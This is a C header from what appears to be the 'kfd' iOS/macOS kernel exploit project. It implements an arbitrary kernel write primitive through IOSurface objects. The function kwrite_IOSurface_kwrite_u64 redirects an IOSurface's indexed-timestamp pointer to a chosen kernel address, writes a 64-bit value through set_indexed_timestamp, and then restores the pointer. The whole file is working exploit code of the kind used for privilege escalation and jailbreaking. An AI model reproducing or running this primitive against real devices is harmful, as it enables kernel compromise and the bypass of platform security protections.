//
//  kwrite_IOSurface.h
//  kfd
//
//  Created by Lars Fröder on 30.07.23.
//
// I attempted to make this standalone from kread but that probably doesn't work, so just select IOSurface for both kread and kwrite

#ifndef kwrite_IOSurface_h
#define kwrite_IOSurface_h

#include "../kread/kread_IOSurface.h"

void kwrite_IOSurface_kwrite_u64(struct kfd* kfd, u64 kaddr, u64 new_value);

void kwrite_IOSurface_init(struct kfd* kfd)
{
    if (kfd->kread.krkw_method_ops.init != kread_IOSurface_init) {
        return kread_IOSurface_init(kfd);
    }
}

void kwrite_IOSurface_allocate(struct kfd* kfd, u64 id)
{
    if (kfd->kread.krkw_method_ops.allocate != kread_IOSurface_allocate) {
        return kread_IOSurface_allocate(kfd, id);
    }
}

bool kwrite_IOSurface_search(struct kfd* kfd, u64 object_uaddr)
{
    if (kfd->kread.krkw_method_ops.search != kread_IOSurface_search) {
        return kread_IOSurface_search(kfd, object_uaddr);
    }
    return true;
}

void kwrite_IOSurface_kwrite(struct kfd* kfd, void* uaddr, u64 kaddr, u64 size)
{
    kwrite_from_method(u64, kwrite_IOSurface_kwrite_u64);
}

void kwrite_IOSurface_find_proc(struct kfd* kfd)
{
    return;
}

void kwrite_IOSurface_deallocate(struct kfd* kfd, u64 id)
{
    if (kfd->kread.krkw_method_ops.deallocate != kread_IOSurface_deallocate) {
        return kread_IOSurface_deallocate(kfd, id);
    }
}

void kwrite_IOSurface_free(struct kfd* kfd)
{
    if (kfd->kread.krkw_method_ops.free != kread_IOSurface_free) {
        return kread_IOSurface_free(kfd);
    }
}

/*
 * 64-bit kwrite function.
 */

void kwrite_IOSurface_kwrite_u64(struct kfd* kfd, u64 kaddr, u64 new_value)
{
    u64 iosurface_uaddr = 0;
    struct iosurface_obj krwObject = { 0 };
    
    if (kfd->kread.krkw_method_ops.init == kread_IOSurface_init) {
        iosurface_uaddr = kfd->kread.krkw_object_uaddr;
        struct iosurface_obj *objectStorage = (struct iosurface_obj *)kfd->kread.krkw_method_data;
        krwObject = objectStorage[kfd->kread.krkw_object_id];
    }
    else {
        iosurface_uaddr = kfd->kwrite.krkw_object_uaddr;
        struct iosurface_obj *objectStorage = (struct iosurface_obj *)kfd->kwrite.krkw_method_data;
        krwObject = objectStorage[kfd->kwrite.krkw_object_id];
    }
    
    u64 backup = *(u64 *)(iosurface_uaddr + dynamic_info(IOSurface__indexedTimestampPtr));
    *(u64 *)(iosurface_uaddr + dynamic_info(IOSurface__indexedTimestampPtr)) = kaddr;
    

    set_indexed_timestamp(krwObject.port, krwObject.surface_id, 0, new_value);
    *(u64 *)(iosurface_uaddr + dynamic_info(IOSurface__indexedTimestampPtr)) = backup;
}


#endif /* kwrite_IOSurface_h */
